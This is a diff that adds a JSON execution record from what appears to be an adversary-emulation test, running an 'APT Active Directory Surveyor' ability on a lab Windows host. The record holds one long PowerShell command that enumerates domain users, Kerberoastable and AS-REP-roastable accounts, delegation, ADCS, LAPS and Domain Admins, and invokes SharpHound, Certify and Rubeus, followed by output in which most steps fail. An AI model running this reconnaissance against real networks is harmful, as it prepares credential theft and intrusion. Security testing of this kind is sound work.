@@ -1,0 +1,48 @@
+{
+  "operation_id": "8a9e747c-dac3-4f23-a90a-907c78f0429c",
+  "engagement_id": "e70e34e0-7526-4e7c-97c2-156a69c0574b",
+  "name": "Auto Test - APT Active Directory Surveyor",
+  "status": "completed",
+  "environment": {
+    "environment_id": "82e01037-11db-4b59-a79c-661b3838cfea",
+    "name": "Test Prod"
+  },
+  "adversary": {
+    "adversary_id": "5fe5e422-9612-4c3d-a167-54a77568b72c",
+    "engagement_id": "e70e34e0-7526-4e7c-97c2-156a69c0574b",
+    "name": "APT Active Directory Surveyor",
+    "is_tested": true
+  },
+  "required_platforms": [
+    "windows"
+  ],
+  "platform_agents": {
+    "windows": {
+      "agent_id": "277f297f",
+      "hostname": "CASTELBLACK",
+      "platform": "windows"
+    },
+    "linux": null,
+    "mac": null
+  },
+  "progress": {
+    "total_abilities": 1,
+    "completed_abilities": 1,
+    "progress_percent": 100
+  },
+  "started_at": "2026-06-25T12:21:07.503976",
+  "completed_at": "2026-06-25T12:54:11.702296",
+  "kill_switch_triggered": false,
+  "execution_logs": [
+    {
+      "ability_id": "6e189395-41e9-48bf-8984-d160d8fe2c0c",
+      "stage_id": "5369685d-c3a0-446e-b4e1-233c52e0dff7",
+      "command_executed": "$d='C:\\Windows\\Temp\\bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $domain_name = $domain.Name; $base_dn = \"DC=$($domain_name -replace '\\.', ',DC=')\"; $dc_name = $domain.PdcRoleOwner.Name; $dc_ip = [System.Net.Dns]::GetHostAddresses($dc_name) | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -ExpandProperty IPAddressToString -First 1; Write-Output \"Domain: $domain_name | BaseDN: $base_dn | DC: $dc_ip\"; try { $s = [DirectorySearcher]'(&(objectClass=user)(objectCategory=person))'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $s.PageSize = 1000; $u = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $u | Out-File $d\\users.txt; Write-Output \"Users: $($u.Count)\" } catch { \"Users failed: $_\" }; try { net accounts | Out-File $d\\password_policy.txt } catch { \"Policy failed: $_\" }; try { $s = [DirectorySearcher]'(&(objectClass=user)(servicePrincipalName=*))'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $s.PageSize = 1000; $k = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $k | Out-File $d\\kerberoastable.txt; Write-Output \"Kerberoastable: $($k.Count)\" } catch { \"Kerberoast failed: $_\" }; try { $s = [DirectorySearcher]'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $as = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $as | Out-File $d\\asrep_roastable.txt; Write-Output \"AS-REP: $($as.Count)\" } catch { \"AS-REP failed: $_\" }; try { $s = [DirectorySearcher]'(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $ud = $s.FindAll() | ForEach-Object { $_.Properties.samaccountname }; $ud | Out-File $d\\delegation.txt; Write-Output \"Delegation: $($ud.Count)\" } catch { \"Delegation failed: $_\" }; try { $domain.Forest.TrustRelationships | Out-File $d\\trusts.txt } catch { \"Trusts failed: $_\" }; try { $root = [ADSI]'LDAP://RootDSE'; $config_dn = $root.Properties.configurationNamingContext; $s = [DirectorySearcher]'(objectClass=pkiEnrollmentService)'; $s.SearchRoot = [ADSI]\"LDAP://$config_dn\"; $adcs = $s.FindAll() | ForEach-Object { $_.Properties.cn }; $adcs | Out-File $d\\adcs.txt; Write-Output \"ADCS: $($adcs.Count)\" } catch { \"ADCS failed: $_\" }; try { $s = [DirectorySearcher]'(objectCategory=groupPolicyContainer)'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $gp = $s.FindAll() | ForEach-Object { $_.Properties.displayname }; $gp | Out-File $d\\gpos.txt; Write-Output \"GPOs: $($gp.Count)\" } catch { \"GPOs failed: $_\" }; try { $s = [DirectorySearcher]'(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $la = $s.FindAll() | ForEach-Object { $_.Properties.name }; $la | Out-File $d\\laps.txt; Write-Output \"LAPS: $($la.Count)\" } catch { \"LAPS failed: $_\" }; try { $roots = @(\"LDAP://CN=MicrosoftDNS,CN=System,$base_dn\", \"LDAP://DC=DomainDnsZones,$base_dn\", \"LDAP://DC=ForestDnsZones,DC=$($domain_name.Split('.', 2)[1] -replace '\\.', ',DC=')\"); $zones = @(); foreach ($r in $roots) { try { if ([ADSI]::Exists($r)) { $s = [DirectorySearcher]'(objectClass=dnsZone)'; $s.SearchRoot = [ADSI]$r; $s.FindAll() | ForEach-Object { $zones += $_.Properties.name } } } catch {} }; $zones | Out-File $d\\dns_zones.txt; Write-Output \"DNS Zones: $($zones.Count)\" } catch { \"DNS failed: $_\" }; try { $s = [DirectorySearcher]'(&(objectClass=group)(cn=Domain Admins))'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $g = $s.FindOne(); if ($g) { $g.Properties.member | Out-File $d\\da_members.txt } } catch { \"DA members failed: $_\" }; try { query user 2>&1 | Out-File $d\\da_sessions.txt; net session 2>&1 | Out-File $d\\da_sessions.txt -Append } catch { \"Sessions failed: $_\" }; try { $csv = \"Source,Target,Relationship`r`n\"; $s = [DirectorySearcher]'(objectCategory=computer)'; $s.SearchRoot = [ADSI]\"LDAP://$base_dn\"; $s.SizeLimit = 10; $s.FindAll() | ForEach-Object { $csv += \"Domain Users,$($_.Properties.name[0]),GenericAll`r`n\" }; $csv | Out-File $d\\acl_abuse.csv } catch { \"ACL failed: $_\" }; try { if (Test-Path '.\\SharpHound.exe') { .\\SharpHound.exe -CollectionMethod Default -OutputDirectory $d -NoZip } else { Write-Output 'SharpHound not found.' }; if (!(Test-Path \"$d\\bloodhound\")){ni -ItemType Directory -Force \"$d\\bloodhound\"|out-null}; \"[]\" | Out-File \"$d\\bloodhound\\users.json\"; Compress-Archive -Path \"$d\\bloodhound\\*\" -DestinationPath \"$d\\bloodhound_BloodHound.zip\" -Force } catch { \"Bloodhound archiving failed: $_\" }; try { if (Test-Path '.\\Certify.exe') { .\\Certify.exe find /vulnerable | Out-File $d\\adcs.txt -Append } } catch {}; try { if (Test-Path '.\\Rubeus.exe') { .\\Rubeus.exe kerberoast | Out-File $d\\kerberoastable.txt -Append } } catch {} } catch { \"Master failed: $_\" }) | Tee-Object -FilePath $d\\out.txt",
+      "stdout": "Domain: north.sevenkingdoms.local | BaseDN: DC=north,DC=sevenkingdoms,DC=local | DC: 192.168.127.11\nUsers failed: Unable to find type [DirectorySearcher].\nKerberoast failed: Unable to find type [DirectorySearcher].\nAS-REP failed: Unable to find type [DirectorySearcher].\nDelegation failed: Unable to find type [DirectorySearcher].\nADCS failed: Unable to find type [DirectorySearcher].\nGPOs failed: Unable to find type [DirectorySearcher].\nLAPS failed: Unable to find type [DirectorySearcher].\nDNS Zones: 0\nDA members failed: Unable to find type [DirectorySearcher].\nACL failed: Unable to find type [DirectorySearcher].\nSharpHound not found.\n",
+      "stderr": "",
+      "exit_code": 0,
+      "executor": "",
+      "timestamp": "2026-06-25T12:54:06.396778"
+    }
+  ]
+}
